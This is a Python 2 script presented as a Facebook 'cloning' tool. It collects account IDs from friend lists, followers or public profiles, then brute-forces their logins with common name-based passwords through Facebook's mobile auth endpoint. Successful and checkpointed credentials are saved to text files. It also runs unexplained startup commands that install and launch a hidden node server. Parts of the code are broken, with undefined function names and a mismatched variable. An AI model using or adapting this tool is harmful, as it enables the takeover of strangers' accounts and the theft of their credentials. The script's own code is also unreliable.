#!/usr/bin/python
# coding=utf-8
# coded by : Tech-Lofer
# https://www.facebook.com/TechLofer

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("python2 __choice__")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... .....')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def abm(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Downloading\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
#Tech-abm
#logo01
logo ="""
\033[1;93m             d8888 888888b.   888b     d888 \033[1;0m
\033[1;94m            d88888 888  "88b  8888b   d8888 \033[1;0m
\033[1;94m           d88P888 888  .88P  88888b.d88888 \033[1;0m
\033[1;93m          d88P 888 8888888K.  888Y88888P888 \033[1;0m
\033[1;94m         d88P  888 888  "Y88b 888 Y888P 888 \033[1;0m
\033[1;93m        d88P   888 888    888 888  Y8P  888 \033[1;0m
\033[1;94m       d8888888888 888   d88P 888   "   888 \033[1;0m
\033[1;93m      d88P     888 8888888P"  888       888 \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;95m➤\033[1;94m Coded by : Tech-Lofer
\033[1;95m➤\033[1;94m Github   : https://github.com/Tech-Lofer
\033[1;95m➤\033[1;94m Fb Page  : https://m.facebook.com/TechLofer
\033[1;95m➤\033[1;94m Update   : Version 3.0
\033[1;97m--------------------------------------------------
                                                """        

idh = []
	
def tech_abm():
    os.system("clear")
    print logo
    abm("\033[1;93mFirst Tools login")
    print("\033[1;97m-------------------")
    username = raw_input("\033[1;97m[+]\033[1;96m Username :\033[1;97m ")
    if username =="Lofer":
        os.system("clear")
        print logo
        print ("[✓] Username : Lofer (Correct)")
        passwordss = raw_input("\033[1;97m[+]\033[1;96m Password :\033[1;97m ")
        if passwordss =="Lofer":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo 
            print ("\033[1;97m[✓]\033[1;97m Username : Lofer\033[1;92m (Correct)")
            print ("\033[1;97m[✓]\033[1;97m Password : Lofer\033[1;92m (Correct)")
            time.sleep(1)
            print('')
            abm("\033[1;92m[✓] Login Successful\033[0;97m")
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            loginvia()
        else:
            print ("[!] Password : "+passwordss+" (Wrong)")
            time.sleep(1)
            tech_Lofer()
    else:
        print ("[!] Username : "+username+" (Wrong)")
        time.sleep(1)
        tech_Lofer()

def loginvia():
    os.system('clear')
    print logo
    print ("\033[1;97m[1]\033[1;97m-⋄-login With Access Token ")
    print ("\033[1;97m[2]\033[1;97m-⋄-login With User And Pass")
    print ("\033[1;97m[0]\033[1;97m-⋄-Back") 
    print("\033[1;97m--------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    basit = raw_input("\n╰─➣ ")
    if basit =="1":
        os.system("clear")
        print logo
        print ("Login With Token").center(50)
	print("\033[1;97m--------------------------------------------------")
        token = raw_input("\033[1;97m[+]\033[1;93m Token :\033[1;97m ")
	print("\033[1;97m--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        print("\r\033[1;92m[✓] Login Successfull\033[0;97m").center(50)
	os.system('xdg-open https://m.facebook.com/Techabm')
        time.sleep(1)
        menu()
    elif basit =="2":
        loginfb()
    elif basit =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    print("Login With Facebook Account").center(50)
    print("Use Proxy to login account ").center(50)
    print("\033[1;97m--------------------------------------------------")
    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
    print("\033[1;97m--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n\033[1;92m[✓] Login Successfull\033[0;97m")
        time.sleep(1)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;91m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    os.system("clear")
    print logo
    print("\t\033[1;97m Account Name : "+name)
    print("\033[1;97m--------------------------------------------------")
    print("\033[1;97m[1]-⋄-\033[1;97mFacebbook Cloning Menu")
    print("\033[1;97m[0]-⋄-\033[1;97mlogout")
    print("\033[1;97m--------------------------------------------------") 
    menu_select()
def menu_select():
    basit = raw_input("\n╰─➣ ")
    if basit =="1":
        crack()
    elif basit =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\r\033[1;32m[✓] Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		
def crack():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	print ("\033[1;97m[1]-⋄-\033[1;97mCrack From Friend List")
	print ("\033[1;97m[2]-⋄-\033[1;97mCrack From Public ID")
	print ("\033[1;97m[3]-⋄-\033[1;97mCrack From Followers")
	print ('\033[1;97m[0]-⋄-\033[1;97mBack')
	print("\033[1;97m--------------------------------------------------")
	crack2()
def crack2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		abm("\tClond from user frindlist acoount")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m loferjanan123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m zarijan1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		abm("\tClond from Public acoount")
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m loferjanan123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m zarijan1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		abm("\tClond from followers acoount")
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m loferjanan123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m zarijan1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password  :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;97m[+]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	print("\033[1;97m[+]\033[1;97m Brute has been start\033[1;0m")
	print("\033[1;97m--------------------------------------------------")
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;94m[\033[1;91mInvalid-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;94m[\033[1;92mValid-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;94m[\033[1;91mInvalid-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;94m[\033[1;92mValid-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:

		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;94m[\033[1;91mInvalid-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass3+"\033[1;91m-⋄-\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;94m[\033[1;92mValid-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass3+"\033[1;91m-⋄-\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:

		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;91mInvalid-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass4+"\033[1;91m-⋄-\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;94m[\033[1;92mValid-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass4+"\033[1;91m-⋄-\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:

		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;94m[\033[1;91mInvalid-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass5+"\033[1;91m-⋄-\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mValid-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass5+"\033[1;91m-⋄-\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[+]\033[1;93m Process Has Been Completed')
	print ('\033[1;97m[+]\033[1;97m Total CP :\033[0;97m '+str(len(cps)))
	print ('\033[1;97m[+]\033[1;97m Total OK :\033[0;97m '+str(len(oks)))
	print ('\033[1;97m[+]\033[1;93m Thank You So Much For Using My Tool')
	print("\033[1;97m--------------------------------------------------")
	raw_input("Press Enter To Back ")
	menu()
	
if __name__ == '__main__':
    Zari_Loferjanan()

